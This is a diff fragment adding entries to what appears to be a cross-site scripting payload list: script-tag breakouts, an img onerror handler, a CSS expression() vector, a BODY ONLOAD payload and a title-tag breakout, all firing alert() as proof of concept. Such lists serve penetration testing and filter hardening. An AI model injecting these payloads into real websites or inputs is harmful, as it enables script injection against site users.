@@ -4,8 +4,15 @@
 ```JavaScript
 <script>alert(1)</script>
 "><script>alert(1)</script>
+"><script>alert(document.domain)</script>
 '"><script>alert(1)</script>
+'"><script>alert(1)</script>"
+';"<script>alert(1)</script>
 </script><script>alert(1)</script>
+<img src='' onerror=alert(/poc/)>
+<DIV STYLE="width: ｅxpression(alert('XSS'));">
+"><BODY ONLOAD=alert(188)>,1/
+</title><script>alert(/poc/)</script>
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 <noscript><p title="</noscript><svg/onload=alert(1)>">
 <xmp><p title="</xmp><svg/onload=alert(1)>">
